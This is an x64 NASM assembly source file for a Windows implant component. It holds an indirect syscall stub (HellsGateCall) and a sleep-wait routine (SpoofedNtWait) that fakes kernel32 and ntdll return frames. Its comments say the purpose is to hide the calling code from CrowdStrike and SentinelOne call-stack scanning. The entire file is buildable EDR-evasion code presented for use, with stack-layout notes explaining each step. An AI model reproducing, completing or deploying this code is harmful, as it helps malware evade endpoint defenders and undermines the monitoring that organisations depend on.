; syscall_stub.asm — x64 indirect syscall trampoline + call-stack spoofing
;
; Build: nasm -f win64 syscall_stub.asm -o syscall_stub.o
;
; ── Call-stack spoofing (single-level, HellsGateCall) ───────────────────────
;
;   CrowdStrike / SentinelOne unwind sleeping threads' call stacks.
;   A return address pointing at our own .text section is a flag.
;
;   HellsGateCall replaces [rsp+0] with g_k32_ret (a lone "ret" in kernel32)
;   so the immediate visible caller is kernel32!<FuncName>+offset.
;   No rsp change → arg5-arg8 at [rsp+0x28..] are untouched.
;
; ── Multi-level stack synthesis (SpoofedNtWait) ──────────────────────────────
;
;   For the sleep-mask wait (NtWaitForSingleObject), we build a deeper fake chain:
;
;     [rsp+0x00]  g_pivot     — add rsp,0x20; ret  (ntdll .text cleanup gadget)
;     [rsp+0x08]  g_btt       — kernel32!BaseThreadInitThunk+N
;     [rsp+0x10]  g_rtl       — ntdll!RtlUserThreadStart+K
;     [rsp+0x18]  (above thread root — most scanners stop here)
;     [rsp+0x20]  (unreachable padding)
;     [rsp+0x28]  real_ret    — actual continuation after wait
;
;   Execution flow after syscall:
;     "syscall; ret"  → pops [rsp+0x00] = g_pivot  (RSP → rsp+8 = P-0x20)
;     g_pivot:  add rsp, 0x20              (RSP → P)
;               ret   → pops [P] = real_ret          (RSP → P+8) ✓
;
; ── Stack layout (SpoofedNtWait entry) ──────────────────────────────────────
;   Let P = RSP at entry (function-call entry, [P] = real_ret)
;
;   After "pop r11":     RSP = P+8,    r11 = real_ret
;   After "sub rsp,0x30": RSP = P-0x28
;
;   [P-0x28] = g_pivot          [rsp+0x00]
;   [P-0x20] = g_btt            [rsp+0x08]
;   [P-0x18] = g_rtl            [rsp+0x10]
;   [P-0x10] = 0                [rsp+0x18]  (above thread root, not inspected)
;   [P-0x08] = 0                [rsp+0x20]
;   [P+0x00] = real_ret         [rsp+0x28]  (written explicitly for safety)
;
;   Pivot (at P-0x20 after pop):  add rsp, 0x20 → RSP=P; ret → pops [P]=real_ret ✓

bits 64
default rel

; ── .data: mutable globals (read/written by C and ASM) ──────────────────────
section .data

    ; HellsGateCall globals
    global g_ssn
    global g_gadget
    global g_k32_ret

    g_ssn     dd 0       ; current SSN for the next HellsGateCall
    g_gadget  dq 0       ; ntdll "syscall; ret" gadget address
    g_k32_ret dq 0       ; kernel32 "ret" gadget (single-level call-stack spoof)

    ; SpoofedNtWait globals — populated by InitCallstackGadgets() in callstack.c
    global g_wait_ssn
    global g_pivot
    global g_btt
    global g_rtl

    g_wait_ssn dd 0      ; SSN for NtWaitForSingleObject
    g_pivot    dq 0      ; add rsp, 0x20; ret — cleanup gadget in ntdll .text
    g_btt      dq 0      ; kernel32!BaseThreadInitThunk + N (first-call return site)
    g_rtl      dq 0      ; ntdll!RtlUserThreadStart + K (first-call return site)

section .text
    global HellsGateCall
    global SpoofedNtWait

; ─── HellsGateCall ───────────────────────────────────────────────────────────
; NTSTATUS HellsGateCall(arg1..arg8)
; Windows x64: rcx=arg1, rdx=arg2, r8=arg3, r9=arg4, [rsp+0x28..]=arg5..arg8
HellsGateCall:
    ; ── Single-level call-stack spoof (conditional on g_k32_ret being set) ───
    mov  r11, qword [rel g_k32_ret]
    test r11, r11
    jz   .no_spoof

    ; Replace [rsp+0] with kernel32 ret gadget; save real return in shadow[0].
    ; Only MOV used — rsp never changes → arg5-arg8 at [rsp+0x28..] untouched.
    xchg r11, [rsp]           ; r11 = real_ret, [rsp+0] = g_k32_ret gadget
    mov  [rsp+8], r11         ; shadow[0] = real return address

.no_spoof:
.do_syscall:
    mov  r10, rcx             ; NT calling convention: arg1 via r10, not rcx
    mov  eax, dword [rel g_ssn]
    jmp  qword [rel g_gadget] ; → "syscall; ret"

; ─── SpoofedNtWait ───────────────────────────────────────────────────────────
; NTSTATUS SpoofedNtWait(HANDLE hObject, BOOLEAN alertable, PLARGE_INTEGER timeout)
; rcx = hObject, rdx = alertable, r8 = timeout  (no stack args — all in regs)
;
; Builds a fake N-frame call stack before invoking NtWaitForSingleObject so that
; EDR scanners inspecting sleeping threads see a legitimate thread-wait chain.
;
; Falls back to a plain indirect syscall if any gadget is NULL (init failed).
SpoofedNtWait:
    ; ── Check if gadgets are ready ────────────────────────────────────────────
    mov  r10, qword [rel g_pivot]
    test r10, r10
    jz   .plain_wait
    mov  r10, qword [rel g_btt]
    test r10, r10
    jz   .plain_wait
    mov  r10, qword [rel g_rtl]
    test r10, r10
    jz   .plain_wait

    ; ── Build fake frame chain ────────────────────────────────────────────────
    ; P = RSP at entry (function-call state: [P] = real_ret)
    pop  r11              ; r11 = real_ret;  RSP → P+8

    sub  rsp, 0x30        ; RSP → P-0x28  (grow stack for fake frames)

    ; Fill fake frames (r10 temporarily used as scratch; saved args in rcx/rdx/r8)
    mov  rax, qword [rel g_pivot]
    mov  qword [rsp+0x00], rax     ; [P-0x28]: cleanup gadget (frame 0)
    mov  rax, qword [rel g_btt]
    mov  qword [rsp+0x08], rax     ; [P-0x20]: BaseThreadInitThunk+N (frame 1)
    mov  rax, qword [rel g_rtl]
    mov  qword [rsp+0x10], rax     ; [P-0x18]: RtlUserThreadStart+K (frame 2)
    xor  eax, eax
    mov  qword [rsp+0x18], rax     ; [P-0x10]: 0 (above thread root)
    mov  qword [rsp+0x20], rax     ; [P-0x08]: 0 (padding)
    mov  qword [rsp+0x28], r11     ; [P+0x00]: real_ret (explicit, for safety)

    ; ── Indirect syscall: NtWaitForSingleObject(rcx, rdx, r8) ────────────────
    mov  r10, rcx
    mov  eax, dword [rel g_wait_ssn]
    jmp  qword [rel g_gadget]
    ; After wait returns:
    ;   "syscall; ret" pops [rsp=P-0x28] = g_pivot → RSP=P-0x20
    ;   pivot "add rsp, 0x20":           → RSP=P
    ;   pivot "ret" pops [P] = real_ret  → RSP=P+8 ✓  (normal function-return state)

.plain_wait:
    ; No gadgets — plain indirect syscall (HellsGateCall-style, no spoof)
    mov  r10, rcx
    mov  eax, dword [rel g_wait_ssn]
    test eax, eax
    jnz  .do_plain
    ; SSN not available — return STATUS_NOT_IMPLEMENTED
    mov  eax, 0xC0000002
    ret
.do_plain:
    jmp  qword [rel g_gadget]
